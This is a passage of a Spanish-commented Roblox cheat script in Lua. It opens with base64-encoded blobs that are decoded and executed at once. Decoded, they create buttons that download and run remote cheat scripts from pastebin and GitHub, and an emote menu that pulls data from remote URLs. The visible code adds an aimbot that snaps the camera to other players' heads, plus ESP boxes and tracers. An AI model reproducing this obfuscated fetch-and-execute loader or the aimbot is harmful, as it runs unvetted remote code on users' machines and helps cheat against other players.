Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vaGVsbG9oZWxsb2hlbGwwMTIzMjEvdGhlcmFweS1ndWkvbWFpbi90aGVyYXB5LWd1aS5sdWEiLCB0cnVlKSkoKQogICBlbmQpCiAgIGVuZCwKfSkKCiBib3Rvbj0gSnVlZ29zdGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiUGlnZ3kgKEVTUCB5IFRQIGEgaXRlbXMpIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvNDhLUktZeloiKSkoKQoKICAgZW5kLAp9KQoKIGJvdG9uPSBKdWVnb3N0YWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJBcnNlbmFsIHRodW5kZXIgY2xpZW50IiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL2FwaS5sdWFybW9yLm5ldC9maWxlcy92My9sb2FkZXJzL2I5NWU4ZmVjZGY4MjRlNDFmNGEwMzAwNDRiMDU1YWRkLmx1YSIpKSgpCgogICBlbmQsCn0pCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIkJyZWFraW5nIFBvaW50IiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQ29sZFN0ZXAyL0JyZWFraW5nLVBvaW50LUZ1bm55LVNxdWlkLUhheC9tYWluL0JyZWFraW5nJTIwUG9pbnQlMjBGdW5ueSUyMFNxdWlkJTIwSGF4Iix0cnVlKSkoKTsKCiAgIGVuZCwKfSkKCiBib3Rvbj0gSnVlZ29zdGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiTmF0dXJhbCBkaXNhc3RlciIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzJkZ2VuZXJhbHNwYW0xL3NjcmlwdHMtYW5kLXN0dWZmL21hc3Rlci9zY3JpcHRzL0xvYWRzdHJpbmdVakhJNlJRcHoybzgiLCB0cnVlKSkoKQoKICAgZW5kLAp9KQoKCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIlRlbGVraW5lc2lzIChOYXR1cmFsIGRpc2FzdGVyKSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhbmRvbXN0cmluZzAvUXdlcnR5L21haW4vcXdlcnR5MS5sdWEiKSkoKQoKICAgZW5kLAp9KQoKIGJvdG9uPSBKdWVnb3N0YWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJCbG94IEZydWl0IChuZWNlc2l0YSBrZXkpIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vMzM0NS1jLWEtdC1zLXUtcy9LbmNyeXB0L3JlZnMvaGVhZHMvbWFpbi9zb3VyY2VzL0Jsb3hGcnVpdC5sdWEiKSkoKQoKICAgZW5kLAp9KQpib3Rvbj0gSnVlZ29zdGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiQmUgYW4gTlBDIG9yIERJRSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JhYzBuSGNrL1NjcmlwdHMvbWFpbi9CZU5wY09yRGllIikpKCJ0Lm1lL2FyY2V1c3hzY3JpcHRzIikKCiAgIGVuZCwKfSkKCiBib3Rvbj0gSnVlZ29zdGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiQmxhZGUgQmFsbChFbWluZW5jZVhMdWEpIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vRW1pbmVuY2VYTHVhL0JsYWRlLXlvdXItQmFsbHMvbWFpbi9CbGFkZUJhbGxMb2FkZXIubHVhIikpKCkKCgogICBlbmQsCn0pCgpib3Rvbj0gSnVlZ29zdGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiQmxhZGUgQmFsbChhdXRvIHBhcnJ5KSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9zY3JpcHRibG94LmNvbS9yYXcvVVBELUJsYWRlLUJhbGwtb3AtYXV0b3BhcnJ5LXdpdGgtdmlzdWFsaXplci04NjUyIikpKCkKCgogICBlbmQsCn0pCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICAgTmFtZSA9ICJCbGFkZSBCYWxsKG5lY2VzaXRhIGtleSkiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9GRkoxL1JvYmxveC1FeHBsb2l0cy9tYWluL3NjcmlwdHMvTG9hZGVyLmx1YSIpKSgpCiAKIAogICAgZW5kLAogfSkKCgoKYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIk5lYnVsYSBodWIgKEJvb2dhIGJvb2dhKSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1lvdXN1Y2s3ODAvTmVidWxhLUh1Yi9yZWZzL2hlYWRzL21haW4vYm9vZ2Fib29nYXJlYm9ybicpKSgpCiAgIGVuZCwKfSkKCmJvdG9uPSBKdWVnb3N0YWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJCcmVhayBpbiAyIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCgiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzM2NUg3QU1yIikpKSgpCgogICBlbmQsCn0pCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIlJlZHogSHViIChCbG94IGZydWl0KSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25ld3JlZHovQmxveEZydWl0cy9yZWZzL2hlYWRzL21haW4vU291cmNlLmx1YXUiKSkoU2V0dGluZ3MpCgogICBlbmQsCn0pCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gImJ1aWxkIGEgYm9hdCBmb3IgdHJlYXN1cmUiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UaGVSZWFsQXN1L0JBQkZUL3JlZnMvaGVhZHMvbWFpbi9KYW4yNV9Tb3VyY2UubHVhJykpKCkKICAgZW5kLAp9KQoKIGJvdG9uPSBKdWVnb3N0YWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJUaHVuZGVyIENsaWVuZChBcnNlbmFsKSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FuZHJld2Rhcmt5eW9mZmljaWFsL3RodW5kZXJjbGllbnQvbWFpbi9tYWluLmx1YScpKSgpOwogICBlbmQsCn0pCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIlN1cGVyIHJpbmcgbW9kKE5hdHVyYWwgZGlzYXN0ZXIpIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvSFNRcXFqVXAnKSkoKQogICBlbmQsCn0pCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIlN1cGVyIHJpbmcgdjYgbW9kKE5hdHVyYWwgZGlzYXN0ZXIpIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvM1QxR3FLelEnKSkoKQogICBlbmQsCn0p
]]

-- Decodificamos y ejecutamos
loadstring(base64decode(encoded))()







------Animaciones------

-- Función para decodificar Base64
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function base64decode(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c=0
		for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

-- Aquí va el script codificado en base64
local encoded = [[
bG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgoKbG9jYWwgQW5pbWFjaW9uZXNUYWIgPSBfRy5XaW5kb3c6Q3JlYXRlVGFiKCJBbmltYWNpb25lcyIsIG5pbCkKCmxvY2FsIHNlbGVjdGVkU3BlZWQgPSAxCmxvY2FsIGN1cnJlbnRUcmFjayA9IG5pbApsb2NhbCBidXR0b25zQ3JlYXRlZCA9IGZhbHNlCmxvY2FsIGJ1dHRvbnNDcmVhdGVkUjYgPSBmYWxzZQoKLS0gRGV2dWVsdmUgZWwgSHVtYW5vaWQgYWN0dWFsCmxvY2FsIGZ1bmN0aW9uIGdldEh1bWFub2lkKCkKCWxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKCWlmIGNoYXIgdGhlbgoJCXJldHVybiBjaGFyOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIkh1bWFub2lkIikKCWVuZAoJcmV0dXJuIG5pbAplbmQKCi0tIEFzZWd1cmEgcXVlIGVsIEFuaW1hdG9yIGVzdMOpIGRpc3BvbmlibGUKbG9jYWwgZnVuY3Rpb24gZ2V0QW5pbWF0b3IoSHVtYW5vaWQpCglmb3IgaSA9IDEsIDEwIGRvCgkJbG9jYWwgYW5pbWF0b3IgPSBIdW1hbm9pZDpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkFuaW1hdG9yIikKCQlpZiBhbmltYXRvciB0aGVuIHJldHVybiBhbmltYXRvciBlbmQKCQlhbmltYXRvciA9IEluc3RhbmNlLm5ldygiQW5pbWF0b3IiKQoJCWFuaW1hdG9yLlBhcmVudCA9IEh1bWFub2lkCgkJdGFzay53YWl0KDAuMDUpCgllbmQKCXJldHVybiBuaWwKZW5kCgotLSBDYXJnYSBhbmltYWNpw7NuIGNvbiBzZWd1cmlkYWQKbG9jYWwgZnVuY3Rpb24gc2FmZVBsYXlBbmltKGFuaW1JZCkKCWxvY2FsIGh1bWFub2lkID0gZ2V0SHVtYW5vaWQoKQoJaWYgbm90IGh1bWFub2lkIHRoZW4gcmV0dXJuIGVuZAoKCWxvY2FsIGFuaW0gPSBJbnN0YW5jZS5uZXcoIkFuaW1hdGlvbiIpCglhbmltLkFuaW1hdGlvbklkID0gYW5pbUlkCgoJbG9jYWwgc3VjY2VzcywgdHJhY2sKCWZvciBhdHRlbXB0ID0gMSwgNSBkbwoJCWxvY2FsIGFuaW1hdG9yID0gZ2V0QW5pbWF0b3IoaHVtYW5vaWQpCgkJaWYgbm90IGFuaW1hdG9yIHRoZW4KCQkJd2Fybigi4p2MIE5vIHNlIHB1ZG8gb2J0ZW5lciBBbmltYXRvci4iKQoJCQlyZXR1cm4KCQllbmQKCQlzdWNjZXNzLCB0cmFjayA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJcmV0dXJuIGFuaW1hdG9yOkxvYWRBbmltYXRpb24oYW5pbSkKCQllbmQpCgkJaWYgc3VjY2VzcyBhbmQgdHJhY2sgdGhlbgoJCQl0cmFjazpQbGF5KCkKCQkJdHJhY2s6QWRqdXN0U3BlZWQoc2VsZWN0ZWRTcGVlZCkKCQkJY3VycmVudFRyYWNrID0gdHJhY2sKCQkJcmV0dXJuCgkJZW5kCgkJdGFzay53YWl0KDAuMSkKCWVuZAoJd2Fybigi4pqg77iPIE5vIHNlIHB1ZG8gY2FyZ2FyIGxhIGFuaW1hY2nDs24gdHJhcyB2YXJpb3MgaW50ZW50b3MuIikKZW5kCgotLSBCb3RvbmVzIHBhcmEgYW5pbWFjaW9uZXMgUjE1CmxvY2FsIGZ1bmN0aW9uIHNldHVwVUlfUjE1KCkKCWlmIGJ1dHRvbnNDcmVhdGVkIHRoZW4gcmV0dXJuIGVuZAoJYnV0dG9uc0NyZWF0ZWQgPSB0cnVlCgoJQW5pbWFjaW9uZXNUYWI6Q3JlYXRlU2VjdGlvbigiQW5pbWFjaW9uZXMgUjE1IikKCglBbmltYWNpb25lc1RhYjpDcmVhdGVCdXR0b24oewoJCU5hbWUgPSAi4p2MIFF1aXRhciBBbmltYWNpw7NuIiwKCQlDYWxsYmFjayA9IGZ1bmN0aW9uKCkKCQkJbG9jYWwgaHVtYW5vaWQgPSBnZXRIdW1hbm9pZCgpCgkJCWlmIGh1bWFub2lkIHRoZW4KCQkJCWZvciBfLCB0cmFjayBpbiBwYWlycyhodW1hbm9pZDpHZXRQbGF5aW5nQW5pbWF0aW9uVHJhY2tzKCkpIGRvCgkJCQkJdHJhY2s6U3RvcCgpCgkJCQllbmQKCQkJZW5kCgkJCWN1cnJlbnRUcmFjayA9IG5pbAoJCWVuZAoJfSkKCglBbmltYWNpb25lc1RhYjpDcmVhdGVTbGlkZXIoewoJCU5hbWUgPSAiVmVsb2NpZGFkIGRlIGFuaW1hY2nDs24iLAoJCVJhbmdlID0gezAsIDEwfSwKCQlJbmNyZW1lbnQgPSAwLjEsCgkJU3VmZml4ID0gIngiLAoJCUN1cnJlbnRWYWx1ZSA9IHNlbGVjdGVkU3BlZWQsCgkJQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKCQkJc2VsZWN0ZWRTcGVlZCA9IHZhbHVlCgkJCWlmIGN1cnJlbnRUcmFjayB0aGVuCgkJCQljdXJyZW50VHJhY2s6QWRqdXN0U3BlZWQodmFsdWUpCgkJCWVuZAoJCWVuZAoJfSkKCgl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQlsb2NhbCBzdWNjZXNzLCBlbW90ZXMgPSBwY2FsbChmdW5jdGlvbigpCgkJCWxvY2FsIHJhdyA9IGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0pveXN0aWNrcGxheXMvQUZFTS9yZWZzL2hlYWRzL21haW4vZW1vdGVzLmpzb24iKQoJCQlyZXR1cm4gSHR0cFNlcnZpY2U6SlNPTkRlY29kZShyYXcpCgkJZW5kKQoKCQlpZiBzdWNjZXNzIHRoZW4KCQkJZm9yIF8sIGVtb3RlIGluIGlwYWlycyhlbW90ZXMpIGRvCgkJCQlpZiBlbW90ZS5uYW1lIGFuZCBlbW90ZS5hbmltYXRpb25pZCB0aGVuCgkJCQkJQW5pbWFjaW9uZXNUYWI6Q3JlYXRlQnV0dG9uKHsKCQkJCQkJTmFtZSA9IGVtb3RlLm5hbWUsCgkJCQkJCUNhbGxiYWNrID0gZnVuY3Rpb24oKQoJCQkJCQkJbG9jYWwgaHVtYW5vaWQgPSBnZXRIdW1hbm9pZCgpCgkJCQkJCQlpZiBodW1hbm9pZCB0aGVuCgkJCQkJCQkJZm9yIF8sIHRyYWNrIGluIHBhaXJzKGh1bWFub2lkOkdldFBsYXlpbmdBbmltYXRpb25UcmFja3MoKSkgZG8KCQkJCQkJCQkJdHJhY2s6U3RvcCgpCgkJCQkJCQkJZW5kCgkJCQkJCQkJc2FmZVBsYXlBbmltKGVtb3RlLmFuaW1hdGlvbmlkKQoJCQkJCQkJZW5kCgkJCQkJCWVuZAoJCQkJCX0pCgkJCQllbmQKCQkJZW5kCgkJZWxzZQoJCQl3YXJuKCLinYwgRXJyb3IgYWwgY2FyZ2FyIGVtb3RlcyBSMTU6IiwgZW1vdGVzKQoJCWVuZAoJZW5kKQplbmQKCi0tIEJvdG9uZXMgcGFyYSBhbmltYWNpb25lcyBSNgpsb2NhbCBmdW5jdGlvbiBzZXR1cFVJX1I2KCkKCWlmIGJ1dHRvbnNDcmVhdGVkUjYgdGhlbiByZXR1cm4gZW5kCglidXR0b25zQ3JlYXRlZFI2ID0gdHJ1ZQoKCUFuaW1hY2lvbmVzVGFiOkNyZWF0ZVNlY3Rpb24oIkFuaW1hY2lvbmVzIFI2IikKCglBbmltYWNpb25lc1RhYjpDcmVhdGVCdXR0b24oewoJCU5hbWUgPSAi4p2MIFF1aXRhciBBbmltYWNpw7NuIFI2IiwKCQlDYWxsYmFjayA9IGZ1bmN0aW9uKCkKCQkJbG9jYWwgaHVtYW5vaWQgPSBnZXRIdW1hbm9pZCgpCgkJCWlmIGh1bWFub2lkIHRoZW4KCQkJCWZvciBfLCB0cmFjayBpbiBwYWlycyhodW1hbm9pZDpHZXRQbGF5aW5nQW5pbWF0aW9uVHJhY2tzKCkpIGRvCgkJCQkJdHJhY2s6U3RvcCgpCgkJCQllbmQKCQkJZW5kCgkJCWN1cnJlbnRUcmFjayA9IG5pbAoJCWVuZAoJfSkKCgl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQlsb2NhbCBzdWNjZXNzLCBlbW90ZXMgPSBwY2FsbChmdW5jdGlvbigpCgkJCWxvY2FsIHJhdyA9IGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2lVQ0tXWEtWIikKCQkJcmV0dXJuIEh0dHBTZXJ2aWNlOkpTT05EZWNvZGUocmF3KQoJCWVuZCkKCgkJaWYgc3VjY2VzcyB0aGVuCgkJCWZvciBfLCBlbW90ZSBpbiBpcGFpcnMoZW1vdGVzKSBkbwoJCQkJaWYgZW1vdGUubmFtZSBhbmQgZW1vdGUuYW5pbWF0aW9uaWQgdGhlbgoJCQkJCUFuaW1hY2lvbmVzVGFiOkNyZWF0ZUJ1dHRvbih7CgkJCQkJCU5hbWUgPSAiW1I2XSAiIC4uIGVtb3RlLm5hbWUsCgkJCQkJCUNhbGxiYWNrID0gZnVuY3Rpb24oKQoJCQkJCQkJbG9jYWwgaHVtYW5vaWQgPSBnZXRIdW1hbm9pZCgpCgkJCQkJCQlpZiBodW1hbm9pZCB0aGVuCgkJCQkJCQkJZm9yIF8sIHRyYWNrIGluIHBhaXJzKGh1bWFub2lkOkdldFBsYXlpbmdBbmltYXRpb25UcmFja3MoKSkgZG8KCQkJCQkJCQkJdHJhY2s6U3RvcCgpCgkJCQkJCQkJZW5kCgkJCQkJCQkJc2FmZVBsYXlBbmltKGVtb3RlLmFuaW1hdGlvbmlkKQoJCQkJCQkJZW5kCgkJCQkJCWVuZAoJCQkJCX0pCgkJCQllbmQKCQkJZW5kCgkJZWxzZQoJCQl3YXJuKCLinYwgRXJyb3IgYWwgY2FyZ2FyIGVtb3RlcyBSNjoiLCBlbW90ZXMpCgkJZW5kCgllbmQpCmVuZAoKLS0gQ2FyZ2EgbG9zIGJvdG9uZXMgYWwgcHJlc2lvbmFyCkFuaW1hY2lvbmVzVGFiOkNyZWF0ZUJ1dHRvbih7CglOYW1lID0gIuKWtu+4jyBDYXJnYXIgQW5pbWFjaW9uZXMgUjE1IChQaXNhIHNvbG8gMSB2ZXopIiwKCUNhbGxiYWNrID0gc2V0dXBVSV9SMTUKfSkKCkFuaW1hY2lvbmVzVGFiOkNyZWF0ZUJ1dHRvbih7CglOYW1lID0gIuKWtu+4jyBDYXJnYXIgQW5pbWFjaW9uZXMgUjYgKFBpc2Egc29sbyAxIHZleikiLAoJQ2FsbGJhY2sgPSBzZXR1cFVJX1I2Cn0pCgotLSBSZXNldCBkZSBhbmltYWNpb25lcyBhbCByZXNwYXduCkxvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oKQoJY3VycmVudFRyYWNrID0gbmlsCmVuZCk=
]]

-- Decodificamos y ejecutamos
loadstring(base64decode(encoded))()










----AIMBOT---
AimbotTab = Window:CreateTab("Aimbot", nil)

-- Configuración
local AimbotSettings = {
    Enabled = false,
    ESPEnabled = false,
    FOVRadius = 350,
    FOVColor = Color3.fromRGB(0, 0, 255),
    ESPColor = Color3.fromRGB(0, 0, 255),
    ESPSizeMultiplier = 5,
    Sensitivity = 0,
    AimPart = "Head",
    TeamCheckEnabled = false,
    TracersEnabled = false,
    TracerColor = Color3.fromRGB(0, 0, 255),
    AutoAimEnabled = false,
    OnlyClosePlayers = false, -- 🔥 NUEVO: solo apuntar a cercanos
    CloseDistanceThreshold = 100,
    WallCheck = false, -- 🔥 NUEVO: distancia en studs para considerar "cercano"
}

local Camera = workspace.CurrentCamera
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local Holding = false

-- FOV circle
local FOVCircle = Drawing.new("Circle")
FOVCircle.Filled = false
FOVCircle.Thickness = 1
FOVCircle.NumSides = 64
FOVCircle.Transparency = 0.7
FOVCircle.Visible = false

-- Obtener el jugador más cercano
local function GetClosestPlayer()
    local closestPlayer = nil
    local shortestDistance = math.huge

    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then
            -- Verificar si no es del mismo equipo
            if AimbotSettings.TeamCheckEnabled and v.Team == LocalPlayer.Team then
                continue
            end
            
            local targetPos = v.Character.HumanoidRootPart.Position

            -- WallCheck
            if AimbotSettings.WallCheck then
                local origin = Camera.CFrame.Position
                local direction = targetPos - origin
                local rayParams = RaycastParams.new()
                rayParams.FilterType = Enum.RaycastFilterType.Blacklist
                rayParams.FilterDescendantsInstances = {LocalPlayer.Character}
                
                local result = workspace:Raycast(origin, direction, rayParams)
                if result and result.Instance and not v.Character:IsAncestorOf(result.Instance) then
                    continue -- Algo bloquea la visión
                end
            end

            local screenPoint, onScreen = Camera:WorldToViewportPoint(targetPos)
            if onScreen then
                local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - UserInputService:GetMouseLocation()).Magnitude
                -- Verificar si está dentro del FOV y si el jugador está cerca (si la opción está activada)
                if distance < shortestDistance and distance < AimbotSettings.FOVRadius then
                    -- Verificar si solo queremos apuntar a jugadores cercanos
                    local distFromPlayer = (targetPos - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                    if AimbotSettings.OnlyClosePlayers and distFromPlayer > AimbotSettings.CloseDistanceThreshold then
                        continue
                    end

                    shortestDistance = distance
                    closestPlayer = v
                end
            end
        end
    end

    return closestPlayer
end


-- Input para apuntar
UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        Holding = true
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        Holding = false
    end
end)

-- Aimbot + FOV Circle
RunService.RenderStepped:Connect(function()
    FOVCircle.Position = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y - 36)
    FOVCircle.Radius = AimbotSettings.FOVRadius
    FOVCircle.Color = AimbotSettings.FOVColor
    FOVCircle.Visible = (Holding or AimbotSettings.AutoAimEnabled) and AimbotSettings.Enabled

    if AimbotSettings.Enabled and (Holding or AimbotSettings.AutoAimEnabled) then
        local target = GetClosestPlayer()
        if target and target.Character and target.Character:FindFirstChild(AimbotSettings.AimPart) then
            local aimPos = target.Character[AimbotSettings.AimPart].Position
            local camPos = Camera.CFrame.Position
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, aimPos)
        end
    end
end)

-- BOX ESP
local ESPBoxes = {}

RunService.RenderStepped:Connect(function()
    for _, box in pairs(ESPBoxes) do
        if box and box.Remove then
            box:Remove()
        end
    end
    ESPBoxes = {}

    if not AimbotSettings.ESPEnabled then return end

    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart")
            and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then

            if AimbotSettings.TeamCheckEnabled and v.Team == LocalPlayer.Team then
                continue
            end

            local hrp = v.Character.HumanoidRootPart
            local rootPos, onScreen = Camera:WorldToViewportPoint(hrp.Position)

            if onScreen then
                local distFromPlayer = (hrp.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                local scaleFactor = 1 / (hrp.Position - Camera.CFrame.Position).Magnitude * 100
                local boxHeight = math.clamp(6 * scaleFactor * AimbotSettings.ESPSizeMultiplier, 2, 500)
                local boxWidth = boxHeight / 1.5

                local box = Drawing.new("Square")
                box.Color = (AimbotSettings.OnlyClosePlayers and distFromPlayer <= AimbotSettings.CloseDistanceThreshold)
    and Color3.fromRGB(255, 0, 0)
    or AimbotSettings.ESPColor
                box.Thickness = 1
                box.Filled = false
                box.Transparency = 1
                box.Size = Vector2.new(boxWidth, boxHeight)
                box.Position = Vector2.new(rootPos.X - boxWidth / 2, rootPos.Y - boxHeight / 2)
                box.Visible = true

                table.insert(ESPBoxes, box)
            end
        end
    end
end)

-- Tracers
local Lines = {}

RunService.RenderStepped:Connect(function()
    for _, line in pairs(Lines) do
        if line and line.Remove then
            line:Remove()
        end
    end
    Lines = {}

    if AimbotSettings.TracersEnabled then
        for _, v in ipairs(Players:GetPlayers()) do
            if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart")
               and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then

                if AimbotSettings.TeamCheckEnabled and v.Team == LocalPlayer.Team then
                    continue
                end

                local hrp = v.Character.HumanoidRootPart
                local screenPos, onScreen = Camera:WorldToViewportPoint(hrp.Position)

                if onScreen then
                    local distFromPlayer = (hrp.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude

                    local line = Drawing.new("Line")
                    line.Thickness = 1.5
                    line.Transparency = 0.9
                    line.Color = (AimbotSettings.OnlyClosePlayers and distFromPlayer <= AimbotSettings.CloseDistanceThreshold)
    and Color3.fromRGB(255, 0, 0)
    or AimbotSettings.TracerColor

                    line.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
                    line.To = Vector2.new(screenPos.X, screenPos.Y)
                    line.Visible = true

                    table.insert(Lines, line)
                end
            end
        end
    end
end)

-- UI Rayfield
AimbotTab:CreateToggle({
    Name = "Aimbot",
    CurrentValue = false,
    Callback = function(state)
        AimbotSettings.Enabled = state
    end
})

AimbotTab:CreateToggle({
    Name = "Auto Apuntar",
    CurrentValue = false,
    Callback = function(state)
        AimbotSettings.AutoAimEnabled = state
    end
})

AimbotTab:CreateSlider({
    Name = "Tamaño del FOV",
    Range = {10, 1000},
    Increment = 1,
    CurrentValue = AimbotSettings.FOVRadius,
    Callback = function(val)
        AimbotSettings.FOVRadius = val
    end
})

AimbotTab:CreateToggle({
    Name = "Wall Check",
    CurrentValue = AimbotSettings.WallCheck,
    Callback = function(value)
        AimbotSettings.WallCheck = value
    end
})

AimbotTab:CreateColorPicker({
    Name = "Color del FOV",
    Color = AimbotSettings.FOVColor,
    Callback = function(val)
        AimbotSettings.FOVColor = val
    end
})

AimbotTab:CreateToggle({
    Name = "ESP",
    CurrentValue = false,
    Callback = function(state)
        AimbotSettings.ESPEnabled = state
    end
})

AimbotTab:CreateColorPicker({
    Name = "Color del ESP",
    Color = AimbotSettings.ESPColor,
    Callback = function(val)
        AimbotSettings.ESPColor = val
    end
})

AimbotTab:CreateSlider({
    Name = "Tamaño del ESP",
    Range = {1, 10},
    Increment = 0.1,
    CurrentValue = AimbotSettings.ESPSizeMultiplier,
    Callback = function(val)
        AimbotSettings.ESPSizeMultiplier = val
    end
})

AimbotTab:CreateToggle({
    Name = "No apuntar al Team",
    CurrentValue = false,
    Callback = function(state)
        AimbotSettings.TeamCheckEnabled = state
    end
})

AimbotTab:CreateToggle({
